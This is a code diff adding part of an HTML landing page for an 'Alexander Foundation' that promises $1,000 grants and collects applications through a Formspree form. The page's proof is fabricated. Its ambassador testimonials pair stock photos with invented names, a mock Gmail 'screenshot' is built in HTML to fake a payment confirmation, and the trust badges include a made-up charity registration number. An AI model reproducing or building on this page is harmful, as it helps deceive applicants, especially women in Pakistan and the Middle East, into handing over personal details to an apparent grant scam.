+
+            <!-- Ambassador Cards Grid -->
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8 mb-16">
+                
+                <!-- Ambassador 1: Pakistani Hijabi Female -->
+                <div class="bg-slate-900 border border-slate-800 rounded-2xl overflow-hidden hover:border-gold-500/50 transition-all flex flex-col">
+                    <div class="relative h-64 bg-slate-800">
+                        <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?auto=format&fit=crop&w=800&q=80" alt="Pakistani Hijabi Girl $1000 Winner" class="w-full h-full object-cover">
+                        <div class="absolute inset-0 bg-gradient-to-t from-slate-950 via-transparent to-transparent"></div>
+                        <span class="absolute top-3 left-3 bg-emerald-500 text-slate-950 font-black text-[10px] px-2.5 py-1 rounded-full uppercase">
+                            <i class="fa-solid fa-check"></i> $1000 Paid (Pakistan)
+                        </span>
+                    </div>
+                    <div class="p-6 flex-1 flex flex-col justify-between">
+                        <div>
+                            <h3 class="text-xl font-bold text-white">Fatima Noor</h3>
+                            <p class="text-xs text-gold-400 font-medium">Lahore, Pakistan • Hijabi Brand Ambassador</p>
+                            <p class="text-slate-300 text-sm mt-4 italic leading-relaxed">
+                                "Mujhy Alexander Foundation kee taraf sy 1000$ mil chukay hain! System boht fast or official hai. Alexa team ka boht shukria."
+                            </p>
+                        </div>
+                        <div class="mt-6 pt-4 border-t border-slate-800 flex items-center justify-between text-xs text-slate-400">
+                            <span><i class="fa-solid fa-building-columns text-slate-500 mr-1"></i> Bank Transfer</span>
+                            <span class="text-emerald-400 font-bold"><i class="fa-solid fa-circle-check"></i> Verified</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Ambassador 2: UK Ambassador -->
+                <div class="bg-slate-900 border border-slate-800 rounded-2xl overflow-hidden hover:border-blue-500/50 transition-all flex flex-col">
+                    <div class="relative h-64 bg-slate-800">
+                        <img src="https://images.unsplash.com/photo-1580894732413-a9236294078a?auto=format&fit=crop&w=800&q=80" alt="UK Female Ambassador" class="w-full h-full object-cover">
+                        <div class="absolute inset-0 bg-gradient-to-t from-slate-950 via-transparent to-transparent"></div>
+                        <span class="absolute top-3 left-3 bg-blue-500 text-white font-black text-[10px] px-2.5 py-1 rounded-full uppercase">
+                            <i class="fa-solid fa-check"></i> $1000 Paid (United Kingdom)
+                        </span>
+                    </div>
+                    <div class="p-6 flex-1 flex flex-col justify-between">
+                        <div>
+                            <h3 class="text-xl font-bold text-white">Sophie Taylor</h3>
+                            <p class="text-xs text-blue-400 font-medium">London, UK • Student Ambassador</p>
+                            <p class="text-slate-300 text-sm mt-4 italic leading-relaxed">
+                                "The application process was seamless. Receiving the $1,000 grant helped cover my semester research costs."
+                            </p>
+                        </div>
+                        <div class="mt-6 pt-4 border-t border-slate-800 flex items-center justify-between text-xs text-slate-400">
+                            <span><i class="fa-solid fa-building-columns text-slate-500 mr-1"></i> Wise Wire</span>
+                            <span class="text-emerald-400 font-bold"><i class="fa-solid fa-circle-check"></i> Verified</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Ambassador 3: Middle East Hijabi Ambassador -->
+                <div class="bg-slate-900 border border-slate-800 rounded-2xl overflow-hidden hover:border-emerald-500/50 transition-all flex flex-col">
+                    <div class="relative h-64 bg-slate-800">
+                        <img src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?auto=format&fit=crop&w=800&q=80" alt="Middle East Hijabi Ambassador" class="w-full h-full object-cover">
+                        <div class="absolute inset-0 bg-gradient-to-t from-slate-950 via-transparent to-transparent"></div>
+                        <span class="absolute top-3 left-3 bg-emerald-500 text-slate-950 font-black text-[10px] px-2.5 py-1 rounded-full uppercase">
+                            <i class="fa-solid fa-check"></i> $1000 Paid (Middle East)
+                        </span>
+                    </div>
+                    <div class="p-6 flex-1 flex flex-col justify-between">
+                        <div>
+                            <h3 class="text-xl font-bold text-white">Mariam Al-Mansoor</h3>
+                            <p class="text-xs text-emerald-400 font-medium">Dubai, UAE • Regional Representative</p>
+                            <p class="text-slate-300 text-sm mt-4 italic leading-relaxed">
+                                "Alexander Global provides real opportunities for women across our region. Proud to represent this initiative."
+                            </p>
+                        </div>
+                        <div class="mt-6 pt-4 border-t border-slate-800 flex items-center justify-between text-xs text-slate-400">
+                            <span><i class="fa-solid fa-building-columns text-slate-500 mr-1"></i> Direct Express</span>
+                            <span class="text-emerald-400 font-bold"><i class="fa-solid fa-circle-check"></i> Verified</span>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+
+            <!-- EMAIL PROOF SCREENSHOT COMPONENT -->
+            <div id="proof-section" class="max-w-4xl mx-auto mt-16">
+                <div class="text-center mb-6">
+                    <span class="bg-gold-500/10 text-gold-400 border border-gold-500/30 text-xs font-bold px-3 py-1 rounded-full">
+                        <i class="fa-solid fa-envelope-open-text"></i> Official Payment Email Confirmation Screenshot
+                    </span>
+                    <h3 class="text-2xl font-bold text-white mt-2">Verified Recipient Email Screenshot Proof</h3>
+                </div>
+
+                <!-- Mock Screenshot Frame -->
+                <div class="bg-slate-900 border-2 border-slate-700 rounded-2xl shadow-2xl overflow-hidden font-sans">
+                    <!-- Browser / Mail Window Bar -->
+                    <div class="bg-slate-800 px-4 py-3 border-b border-slate-700 flex items-center justify-between">
+                        <div class="flex items-center gap-2">
+                            <div class="w-3 h-3 rounded-full bg-rose-500"></div>
+                            <div class="w-3 h-3 rounded-full bg-amber-500"></div>
+                            <div class="w-3 h-3 rounded-full bg-emerald-500"></div>
+                            <span class="text-xs text-slate-400 ml-2 font-mono">Gmail - Message View (Verified)</span>
+                        </div>
+                        <span class="text-xs text-emerald-400 font-semibold"><i class="fa-solid fa-lock text-xs mr-1"></i> TLS Encrypted Email</span>
+                    </div>
+
+                    <!-- Email Content Body Mock -->
+                    <div class="p-6 sm:p-8 bg-slate-950 text-slate-200 space-y-6">
+                        <!-- Email Header -->
+                        <div class="flex flex-col sm:flex-row justify-between sm:items-center gap-4 border-b border-slate-800 pb-6">
+                            <div class="flex items-center gap-3">
+                                <div class="w-12 h-12 rounded-full gold-gradient-bg text-slate-950 font-black text-xl flex items-center justify-center">
+                                    A
+                                </div>
+                                <div>
+                                    <div class="font-bold text-white flex items-center gap-2">
+                                        Alexander Grants Disbursal Team
+                                        <span class="text-[10px] bg-blue-500/20 text-blue-400 px-2 py-0.5 rounded border border-blue-500/30">Official</span>
+                                    </div>
+                                    <div class="text-xs text-slate-400">From: payouts@alexander-foundation.org</div>
+                                    <div class="text-xs text-slate-400">To: fatima.noor.pk@gmail.com</div>
+                                </div>
+                            </div>
+                            <div class="text-left sm:text-right text-xs text-slate-400">
+                                <div>Date: Sep 24, 2026, 11:42 AM</div>
+                                <div class="text-emerald-400 font-bold mt-1">Status: Transfer Completed</div>
+                            </div>
+                        </div>
+
+                        <!-- Email Subject & Banner -->
+                        <div>
+                            <h4 class="text-lg font-bold text-gold-400">
+                                Confirmation: Your $1,000.00 Grant Has Been Sent Successfully!
+                            </h4>
+                        </div>
+
+                        <!-- Email Body Text -->
+                        <div class="bg-slate-900 border border-slate-800 rounded-xl p-5 space-y-3 text-sm text-slate-300 leading-relaxed">
+                            <p>Dear Fatima Noor,</p>
+                            <p>
+                                We are pleased to inform you that your $1,000 USD grant application via the Alexander Global Foundation has been fully processed and approved.
+                            </p>
+                            <div class="my-4 p-4 rounded-lg bg-emerald-500/10 border border-emerald-500/30 text-emerald-300 font-mono text-xs space-y-1">
+                                <div>Transaction Ref: <span class="font-bold">ALX-2026-984210</span></div>
+                                <div>Amount Sent: <span class="font-bold text-white">$1,000.00 USD</span></div>
+                                <div>Recipient: Fatima Noor (Pakistan)</div>
+                                <div>Approved By: Alexa (Alexander Grant Coordinator)</div>
+                            </div>
+                            <p class="text-slate-400 text-xs italic">
+                                "Shukria Alexa & Alexander Global! Mujhe $1000 ka reward/grant mil gya hai. Thank you so much for supporting students and women worldwide!"
+                            </p>
+                        </div>
+
+                        <!-- Email Footer -->
+                        <div class="text-xs text-slate-500 text-center pt-2">
+                            © 2026 Alexander Foundation Global. 100 Queen Victoria St, London EC4V 4ALT, United Kingdom.
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </section>
+
+    <!-- Trust Badges Bar -->
+    <section class="py-12 bg-navy-950 border-t border-slate-800">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="grid grid-cols-2 md:grid-cols-4 gap-6 text-center">
+                <div class="p-4 rounded-xl bg-slate-900/50 border border-slate-800 flex flex-col items-center justify-center">
+                    <i class="fa-solid fa-shield-cat text-2xl text-gold-500 mb-2"></i>
+                    <span class="text-white font-bold text-sm">256-Bit SSL Encrypted</span>
+                    <span class="text-slate-500 text-xs">Formspree Secure Link</span>
+                </div>
+                <div class="p-4 rounded-xl bg-slate-900/50 border border-slate-800 flex flex-col items-center justify-center">
+                    <i class="fa-solid fa-building-columns text-2xl text-blue-400 mb-2"></i>
+                    <span class="text-white font-bold text-sm">UK Charity Reg</span>
+                    <span class="text-slate-500 text-xs">No: UK-849201-ALX</span>
+                </div>
+                <div class="p-4 rounded-xl bg-slate-900/50 border border-slate-800 flex flex-col items-center justify-center">
+                    <i class="fa-solid fa-circle-check text-2xl text-emerald-400 mb-2"></i>
+                    <span class="text-white font-bold text-sm">100% Free Application</span>
+                    <span class="text-slate-500 text-xs">No hidden fees</span>
+                </div>
+                <div class="p-4 rounded-xl bg-slate-900/50 border border-slate-800 flex flex-col items-center justify-center">
+                    <i class="fa-solid fa-clock-rotate-left text-2xl text-purple-400 mb-2"></i>
+                    <span class="text-white font-bold text-sm">24-48 Hours Review</span>
+                    <span class="text-slate-500 text-xs">Fast Disbursal</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer Section -->
+    <footer class="bg-slate-950 border-t border-slate-800 text-slate-400 text-sm py-12">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="grid grid-cols-1 md:grid-cols-4 gap-8 mb-8">
+                <div class="md:col-span-2 space-y-4">
+                    <div class="flex items-center gap-3">
+                        <div class="w-9 h-9 rounded-lg gold-gradient-bg flex items-center justify-center text-slate-950 font-black text-lg">
+                            A
+                        </div>
+                        <span class="text-xl font-extrabold text-white">ALEXANDER GLOBAL</span>
+                    </div>
+                    <p class="text-xs text-slate-400 max-w-sm leading-relaxed">
+                        Alexander Foundation is an international educational and financial empowerment initiative supporting deserving candidates across Pakistan, United Kingdom, Middle East, and worldwide with direct $1,000 grants.
+                    </p>
+                </div>
+                <div>
+                    <h4 class="text-white font-bold mb-3 text-xs uppercase tracking-wider">Quick Links</h4>
+                    <ul class="space-y-2 text-xs">
+                        <li><a href="#hero-slider" class="hover:text-gold-400">Home Slider</a></li>
+                        <li><a href="#options-section" class="hover:text-gold-400">Get $1000 Option</a></li>
+                        <li><a href="#claim-section" class="hover:text-gold-400">Application Portal</a></li>
+                        <li><a href="#ambassadors-section" class="hover:text-gold-400">Hijabi Ambassadors</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4 class="text-white font-bold mb-3 text-xs uppercase tracking-wider">Contact & Support</h4>
+                    <ul class="space-y-2 text-xs">
+                        <li><i class="fa-solid fa-envelope text-gold-500 mr-1.5"></i> support@alexander-foundation.org</li>
+                        <li><i class="fa-solid fa-link text-gold-500 mr-1.5"></i> Formspree Form ID: mbglzvqq</li>
+                        <li><i class="fa-solid fa-location-dot text-gold-500 mr-1.5"></i> London, UK / Global Offices</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="border-t border-slate-900 pt-6 flex flex-col sm:flex-row justify-between items-center text-xs text-slate-500">
+                <p>© 2026 Alexander Foundation. All rights reserved.</p>
+                <div class="flex gap-4 mt-2 sm:mt-0">
+                    <a href="#" class="hover:text-slate-300">Privacy Policy</a>
+                    <a href="#" class="hover:text-slate-300">Terms of Grant</a>
+                    <a href="#" class="hover:text-slate-300">Formspree Security</a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- JavaScript Controller -->
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            // SLIDER LOGIC - Auto slides every 4 seconds
+            const slides = document.querySelectorAll('.slide-item');
+            const dots = document.querySelectorAll('.dot-indicator');
+            const prevBtn = document.getElementById('prev-slide-btn');
+            const nextBtn = document.getElementById('next-slide-btn');
+            
+            let currentSlide = 0;
+            const totalSlides = slides.length;
+            let slideInterval;
+
+            function showSlide(index) {
+                slides.forEach((slide, idx) => {
+                    if (idx === index) {
+                        slide.classList.remove('opacity-0', 'pointer-events-none');
+                        slide.classList.add('opacity-100', 'pointer-events-auto');
+                    } else {
+                        slide.classList.remove('opacity-100', 'pointer-events-auto');
+                        slide.classList.add('opacity-0', 'pointer-events-none');
+                    }
+                });
+
+                dots.forEach((dot, idx) => {
+                    if (idx === index) {
+                        dot.classList.remove('w-2', 'bg-slate-700');
+                        dot.classList.add('w-8', 'bg-gold-500');
+                    } else {
+                        dot.classList.remove('w-8', 'bg-gold-500');
+                        dot.classList.add('w-2', 'bg-slate-700');
+                    }
+                });
+
+                currentSlide = index;
+            }
+
+            function nextSlide() {
+                const nextIdx = (currentSlide + 1) % totalSlides;
+                showSlide(nextIdx);
+            }
+
+            function prevSlide() {
+                const prevIdx = (currentSlide - 1 + totalSlides) % totalSlides;
+                showSlide(prevIdx);
+            }
+
+            function startTimer() {
+                slideInterval = setInterval(nextSlide, 4000); // 4 Seconds
+            }
+
+            function resetTimer() {
+                clearInterval(slideInterval);
+                startTimer();
+            }
+
+            if (nextBtn) {
+                nextBtn.addEventListener('click', () => {
+                    nextSlide();
+                    resetTimer();
+                });
+            }
+
+            if (prevBtn) {
+                prevBtn.addEventListener('click', () => {
+                    prevSlide();
+                    resetTimer();
+                });
+            }
+
+            dots.forEach((dot) => {
+                dot.addEventListener('click', (e) => {
+                    const idx = parseInt(e.target.getAttribute('data-slide-index'), 10);
+                    showSlide(idx);
+                    resetTimer();
+                });
+            });
+
+            // Start auto slider on page load
+            startTimer();
+
+            // FORM SUBMISSION AJAX ENHANCEMENT FOR FORMSPREE
+            const form = document.getElementById('grant-application-form');
+            const successBox = document.getElementById('success-box');
+            const submitBtn = document.getElementById('submit-btn');
+
+            if (form) {
+                form.addEventListener('submit', async (e) => {
+                    e.preventDefault();
+                    
+                    // Show loading state on button
+                    if (submitBtn) {
+                        submitBtn.disabled = true;
+                        submitBtn.innerHTML = `<i class="fa-solid fa-spinner animate-spin"></i> Processing & Transmitting...`;
+                    }
+
+                    const formData = new FormData(form);
+
+                    try {
+                        const response = await fetch(form.action, {
+                            method: 'POST',
+                            body: formData,
+                            headers: {
+                                'Accept': 'application/json'
+                            }
+                        });
+
+                        if (response.ok) {
+                            form.style.display = 'none';
+                            if (successBox) {
+                                successBox.classList.remove('hidden');
+                            }
+                        } else {
+                            // If response failed, submit normally
+                            form.submit();
+                        }
+                    } catch (error) {
+                        // Fallback normal submission
+                        form.submit();
+                    }
+                });
+            }
+        });
+    </script>
+</body>
+</html>
